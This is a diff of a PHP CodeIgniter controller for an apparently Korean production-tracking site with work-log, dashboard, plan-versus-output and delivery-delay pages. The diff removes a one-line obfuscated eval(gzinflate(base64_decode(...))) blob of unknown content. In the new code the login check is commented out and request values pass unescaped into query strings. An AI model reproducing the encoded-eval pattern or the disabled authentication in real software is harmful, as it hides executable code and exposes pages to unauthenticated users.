@@ -1,1 +1,371 @@
-<?php eval(gzinflate(base64_decode('DdZFrsVYtgTQ4VSm3DCTStUwM8O13fkyM7NH/98ETmMfRcQqr3T4p/7aqRrSo/wnS/eSwP6vKPO5KP/5T5VUMr85hDAHFQ7ikS7clnRAommyTP+Zu3v6MW5/EETYyUfN+o/4vT78Kz7q59IysC7PpNnHqNnI+IqtD5Dkpzzbh1FPNdDIIK3zcGMGIHQn734cWFr6j5yvZ6c0QPuBGW+xsB3bJQzRAPwqbCuY6Ci6J9++7OeCP9dAVn1nKZ2N4ls33KspuNCQtj4+HUIsdhlYNJsByguO6VOVbdi9h7UKFQ2AkOOoVfl4oR6y3dG2Nnhvp+wS3TfC1VvZQZXAq8R0ad8U1LE9ZyCtiwOZEwERtiGS97QaUw5FRI+Earb6MXZBGSfIaVvvO5rvJ3xYS0/Ia/yvbOzVdg29HGb6EPN9prM7ZNR6+HkLSvYDl3tjLk8tclSMk9gLqtDS0Zuw97lOWzR8dRcQ8vC0a5eNMJPz9ky8snpt0pe/rNsNkG0kA9uqamNo+yCTGIehGMCgdAGDrb8KGK9FFxCmJyB4olugxcubg9Uqgp8wnOccryOwbJqTMsXZ4O1b30Ki9VrBpWmdy/kpUfk8a02fip7PjoFrnt4SqKgPr6xD5egz1cVrviychwNzaaWUhjXIEt3whVZQHfD6LWqbM36AbC9o6ARfi1A7KL6JUDIUKJOyDNIBMCnrSOV9Nb7fB0cHScK3ZeNIh5fc9gYoV4hmwbkDJ7+cjGOl1+yUyRLYiA432W/TYU5dCsaCu83DLyWe+wLbgiwN6kEWTYrf1qskIBEaOaDNQUfo5qpc4xymf/bZ3zneVJmHnMp0vyP45NuhGsOtTEmdfngyzuUQHhNfKNbruCjKWNGqjtTAm5hqCU1C+ntyNH3E++soAmSzFiWxXP2PHnA13RfzjSrd7Zb+5SbtTH0bwUk4lAA0y2upbggzGcdgtq5bfCQoygmyFcm3Pcz6ksQw7guqf7Qvetykw6jRii4LnZtGINulz19Ww1VpbrI3sHS3OjZhMCOIKAi2b/TIf5R59NrArgWCJPEUfnS0Ep6VcFwNYSUK1LGGbGwtlleZfMZJWkNIUKO6laTaF+TChDjiQBZU83UFtvd9iOOKS9U3YzWf77h+GNpDpbfgYkE31tqhM/hEoWfVyU8vDv3Z3dEj+DJTUz4bLq7vfppNCKklJ/YgfSFHNb+03VI1dzCqiBDNsbHRVEDmmg6k2ZHZ8/CvwHepAIW8DcUCHYJiCui61VbB3Z9SEJX777z0TbLIRWG+6GkRlM5u1zkC+VlDBfg9Wx1GqxZ2XfguviR3zPSPLmKJtCH4wzNfkQZXfBo10Jh9wAYUTiwNXFrK6YfiPIFNRgSGREJWEgXkS7aY/7WxLcm2KpjnmFf8Ja2QNq0rWgs6DRJiLWwv+NdXpdWWU6wt/Ke8cuix3lyenVbSpjzXl6NQqD3qEilNDmH3+m/DgY20zwXhatsaiNQUxSkgs0/uRsEW0Otj101lFh7761Cw8Khu2f03ZC6I3kbCxDdPunSgb53GBN/suQagu6WxwQjOFDdbK7ozKgALNAW2kCwuTEedcjpOm8KHS7leX8YIbZixRz8f045DKzeXKxuztq6KjG2Tk4ewlg/ZteX555oo/Uh+06aioOD0SLhwNpOc8+4K7VcZkHKWYNNWCAiEee7zi/39asqJxoI1p2ZzvtbFM62K3kHo3eX6Ar8Zq+naTp0sKzARm9GtZpK7yrXxJeH1+9awlsUXzLNzJXdbHKHj24UK/lZqiRQLQ4ZYS5sEMJZADXQZVpKPsrfVmD+r69gspzlbBd5ST2v+yHAOy1JHBe+AhTc1Loz5G7FORQX12wj2SmdWYf9Sw3ynfdyeJHSS0tpqfEYzNEX2PqW/XRwRnCqrLylRzyg3iZ849dQmuj6GO18KE0X7MvyIBfOtgwCcgp9+4G+tSpoRoPltM/jTa/OEz3j5GjcUjBVooKOyxGhjEk58nph4yJ5pqjGUF2tADzx0N/hzM38dmn5VYoEdtfSkdGYk9Io9tJ1U3wLPKu1aIgk+uC2zxZxaUrM/2OtS/hIddWv4wLd75AA1K0smlNhQepcbvt0uUmx4VKr2OIdpsyD7mOUkLGi9fy9NY5WJ0KweyHFtYqKrRAr9iVkh9lMMnzY0Jd7mb8zn45Wbmur4LCqByBiLhgKR1ojwBjR3YLA0Yz38gtaIP861Nec8UET5dhlqN61FdKXCCgCrQi2mg8+MTemJ4iRlynlfrfBvIpC4rSyoKSW9etDypniZqqGxQ1R3lUZOAgKxzOxMPMzf7tfTbBZROFB4xpB0KQQ4urwvu6jGPK30PDXLVySxk9rkLmf7LILxdwKTsaT4UvUn4N5Jsd4w7dHPSkXQrn+RD+m4KHjsjhgaJ//5Av3KPaYyy6fjWiYdn1a1EdTM40i5qnjaQvPD4dNzGO9Lv77G+ZtHHwgmT7wS/rdh09hDSaMUvCX+ap37QORmHTBahExuAe7JIOgdsah+31RSVQZ5pr5wnm5TQ+YkBi/+SmJo631bf5ZtCMmK60zyzqlIk6bb5xRVlEPzW5TIE+jwIsnhL86M5SJPL/l2M6BuDNgNP+dfuhijijh/7KJ+fdcTDvL8yF/uDG/bvaU8FRDn0FBqvmz+lShXLqNKBw5ihja8qn8a8ehkIn3UssXs64V33ZEm1q4/2DSnFPkqaaWU2gIkkzvQJesmIXn6UmpGMKxiA9R8n/zU01HD5rNokdY1q5Vsbg6X28ql9Bj+np6xeDkjve3kV+YKbjT48VWYgVQgEblSx9WfBceU1Gfka4vekI2BBXhguNXLiFSSxfrbpqtQNe3Vp8kaoMTTK9Caqhl/7sXF+oWEEpA36j2o8kXxga1LXcebJmh3MVQRXngi1VwdLEliQYYtWKCSM03znHhOxChcxnsu1uE+EZ7JNGXjOlW3dKmf3wwx5BpzopmP1WRR23YL0O/G4rPp+j/GBID5+8OcANxI8BvG07XowKM+ZvcWAdD/fOTcf0IwRoHi3NQ6Micu7mk7B1UPV1deKkTdncp6IvNiXv6x7zIkRQeI5boT/iyqjNKDCNmGCViqaN8LsHXIqp16sox9G3afKEzt1KwIz1HQxXj5pDeK+dMErIYLtdsPGZ1rSZymqQfWxfAAWA4p+HA7oS3zJUsTS0Nl+jtJ/QXHL3Uf9PZ5Xvzxg2uE43H+BTYNxekD/IC3PDmRNTWj3WOMfJ3303Lxti3WY4ShjmsceQpiSCfIQv1ncL4rCN0PwyUky2fdLjir8fjidNcSG/NHh9XlhHLub7LbX+HWlhMTLJiSeu5Z/rdLqmTkgbgzyZ4HEYtLEOQB2CIE2dbfxC0HlsCEvX8Edg95NUazzU/oZ4NhW10TaEuaiYeWB0CcoaFfceuvCgQuQLhFtBoNuhmvly/hY8v9gVJGORdKZMBAZs2UXIC5+5M9L+zf50IN/dkY0/guYy+0M4oUxU+THBAKv5hKPBrzBQnoWBvS1wkBdUvxdjgAUwsoSNFVVYEgvQE6WM0UBUon8dP5Qqc3yigRXNez01TL5sSy9t5QoFBeDmC/KLuTnYSV1l+mCIFIGgncrIpdezj59IvOsWxpJZwThSI/CaGdg1WlGyCtsst7sCwHc73CrneNIn9S0N6gIKs1wKp8MUsdUYcAPufUfS9vEIQu3L7/97///Pvvv//9fw==')));
+<?php
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+class Mobile extends CI_Controller {
+
+	public $data;
+
+	public function __construct()
+	{
+		parent::__construct();
+
+		$this->data['pos'] = $this->uri->segment(1);
+        $this->data['subpos'] = $this->uri->segment(2);
+		
+		$this->load->model(array('act_model','bom_model','main_model','release_model'));
+
+		$this->data['siteTitle'] = $this->config->item('site_title');
+
+		
+
+	}
+
+	public function _remap($method, $params = array())
+	{
+		if($this->input->is_ajax_request()){
+            if( method_exists($this, $method) ){
+                call_user_func_array(array($this,$method), $params);
+            }
+        }else{ //ajax가 아니면
+			
+			if (method_exists($this, $method)) {
+
+				$user_id = $this->session->userdata('user_id');
+				//if(isset($user_id) && $user_id != ""){
+					
+				$this->load->view('/layout/m_header',$this->data);
+				call_user_func_array(array($this,$method), $params);
+				$this->load->view('/layout/m_tail');
+
+				//}else{
+
+				//	alert('로그인이 필요합니다.',base_url('register/login'));
+
+				//}
+
+            } else {
+                show_404();
+            }
+
+        }
+		
+	}
+
+	public function m1()
+	{
+		$data['title'] = "일일작업일지";
+		
+		
+		$data['str'] = array(); //검색어관련
+		//$data['str']['gjgb'] = $this->input->get('gjgb'); //BL_NO
+		$data['str']['mline'] = $this->input->get('mline'); //M_LINE
+		$data['M_TITLE'] = "전체";
+		
+		$params['GJ_GB'] = "SMT";
+
+		$data['qstr'] = "?P";
+		/*
+		if(!empty($data['str']['gjgb'])){
+			$params['GJ_GB'] = $data['str']['gjgb'];
+			$data['qstr'] .= "&gjgb=".$data['str']['gjgb'];
+		}*/
+		if(!empty($data['str']['mline'])){
+			$params['M_LINE'] = $data['str']['mline'];
+			$data['qstr'] .= "&mline=".$data['str']['mline'];
+			
+			$data['M_TITLE'] = $params['M_LINE'];
+		}
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):15;
+		
+
+		
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+		
+		
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['actList']  = $this->act_model->get_actplan_list($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->act_model->get_actplan_cut($params);
+
+		
+		
+		$data['M_LINE']   = $this->main_model->get_selectInfo("tch.CODE","M_LINE");
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		$this->load->view('/mobile/m1',$data);
+	}
+
+
+
+	public function m2()
+	{
+		$data['title'] = "생산현황판";
+
+		$data['leftData'] = $this->release_model->get_left_data();
+		$data['toDate'] = $this->release_model->get_todate_num();
+		$data['viewList'] = $this->release_model->get_rel_view();
+
+		$this->load->view('/mobile/m2',$data);
+
+	}
+
+
+	public function ajax_actplan_info()
+	{
+		$data['title'] = "상세정보";
+		$param['idx'] = $this->input->post("idx"); //actplan idx
+		$data['ACTPLAN'] = $this->act_model->get_actplan_info($param['idx']);
+		$this->load->view('/mobile/m3_view',$data);
+	}
+
+
+	public function m3()
+	{
+		//$data['str'] = array(); //검색어관련
+		//$data['str']['gjgb'] = $this->input->get('gjgb'); //BL_NO
+		//$data['str']['lot'] = $this->input->get('lot'); //BL_NO
+		//$data['str']['blno'] = $this->input->get('blno'); //BL_NO
+		//$data['str']['customer'] = $this->input->get('customer'); //CUSTOMER
+		//$data['str']['finish'] = $this->input->get('finish'); //CUSTOMER
+		//$data['str']['st1'] = $this->input->get('st1'); //PLN_DATE
+		//$data['str']['st2'] = $this->input->get('st2'); //PLN_DATE
+		
+		//$params['BL_NO'] = "";
+		//$params['LOT_NO'] = "";
+		$params['GJ_GB'] = "SMT";
+		//$params['CUSTOMER'] = "";
+		//$params['FINISH'] = "";
+		//$params['ST1'] = "";
+		//$params['ST2'] = "";
+
+		//$data['qstr'] = "?P";
+		/*
+		if(!empty($data['str']['gjgb'])){
+			$params['GJ_GB'] = $data['str']['gjgb'];
+			$data['qstr'] .= "&gjgb=".$data['str']['gjgb'];
+		}*/
+
+		/*
+		if(!empty($data['str']['lot'])){
+			$params['LOT_NO'] = $data['str']['lot'];
+			$data['qstr'] .= "&lot=".$data['str']['lot'];
+		}
+		if(!empty($data['str']['blno'])){
+			$params['BL_NO'] = $data['str']['blno'];
+			$data['qstr'] .= "&blno=".$data['str']['blno'];
+		}
+		if(!empty($data['str']['customer'])){
+			$params['CUSTOMER'] = $data['str']['customer'];
+			$data['qstr'] .= "&customer=".$data['str']['customer'];
+		}
+		if(!empty($data['str']['finish'])){
+			$params['FINISH'] = $data['str']['finish'];
+			$data['qstr'] .= "&finish=".$data['str']['finish'];
+		}
+		if(!empty($data['str']['st1'])){
+			$params['ST1'] = $data['str']['st1'];
+			$data['qstr'] .= "&st1=".$data['str']['st1'];
+		}
+		if(!empty($data['str']['st2'])){
+			$params['ST2'] = $data['str']['st2'];
+			$data['qstr'] .= "&st2=".$data['str']['st2'];
+		}*/
+
+		
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+
+
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+
+		
+
+		$data['title'] = "생산계획대비실적";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['actList']  = $this->act_model->get_actplan_list($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->act_model->get_actplan_cut($params);
+
+		//$data['M_LINE']   = $this->main_model->get_selectInfo("tch.CODE","M_LINE");
+
+		
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		/* pagenation end */
+
+		$this->load->view('/mobile/m3',$data);
+	}
+
+
+	public function m4($idx=0)
+	{
+		$data['str'] = array(); //검색어관련
+		$data['str']['insert1'] = $this->input->get('insert1'); //DATE
+		$data['str']['insert2'] = $this->input->get('insert2'); //DATE
+		
+		$params['INSERT1'] = "";
+		$params['INSERT2'] = "";
+
+		$data['qstr'] = "?P";
+		if(!empty($data['str']['insert1'])){
+			$params['INSERT1'] = $data['str']['insert1'];
+			$data['qstr'] .= "&insert1=".$data['str']['insert1'];
+		}
+		if(!empty($data['str']['insert2'])){
+			$params['INSERT2'] = $data['str']['insert2'];
+			$data['qstr'] .= "&insert2=".$data['str']['insert2'];
+		}
+
+		$data['perpage'] = ($this->input->get('perpage') != "")?$this->input->get('perpage'):20;
+		
+
+		$params['ACT_DATE'] = true; //완료예정일체크
+
+		
+		//PAGINATION
+		$config['per_page'] = $data['perpage'];
+		$config['page_query_string'] = true;
+		$config['query_string_segment'] = "pageNum";
+		$config['reuse_query_string'] = TRUE;
+
+        $pageNum = $this->input->get('pageNum') > '' ? $this->input->get('pageNum') : 0;
+        //$start = $config['per_page'] * ($pageNum - 1);
+		
+		$start = $pageNum;
+		$data['pageNum'] = $start;
+
+		
+
+		$data['title'] = "납기지연예상";
+		$user_id = $this->session->userdata('user_id');
+		$this->data['userName'] = $this->session->userdata('user_name');
+
+
+		$data['actList']  = $this->act_model->get_actplan_list1($params,$start,$config['per_page']);
+		$this->data['cnt'] = $this->act_model->get_actplan_cut1($params);
+
+		$data['idx'] = $idx;
+		
+		/* pagenation start */
+
+		$this->load->library("pagination");
+		$config['base_url'] = base_url(uri_string());
+        $config['total_rows'] = $this->data['cnt'];
+
+
+		$config['full_tag_open'] = "<ul class='pagination'>";
+		$config['full_tag_close'] = '</ul>';
+		$config['num_tag_open'] = '<li>';
+		$config['num_tag_close'] = '</li>';
+		$config['cur_tag_open'] = '<li class="active"><a href="#">';
+		$config['cur_tag_close'] = '</a></li>';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['first_tag_open'] = '<li>';
+		$config['first_tag_close'] = '</li>';
+		$config['last_tag_open'] = '<li>';
+		$config['last_tag_close'] = '</li>';
+		$config['prev_link'] = '<i class="fa fa-long-arrow-left"></i>Previous Page';
+		$config['prev_tag_open'] = '<li>';
+		$config['prev_tag_close'] = '</li>';
+		$config['next_link'] = 'Next Page<i class="fa fa-long-arrow-right"></i>';
+		$config['next_tag_open'] = '<li>';
+		$config['next_tag_close'] = '</li>';
+
+
+		$this->pagination->initialize($config);
+        $this->data['pagenation'] = $this->pagination->create_links();
+
+		/* pagenation end */
+		$this->load->view('/mobile/m4',$data);
+	}
+	
+
+}
+
+?>
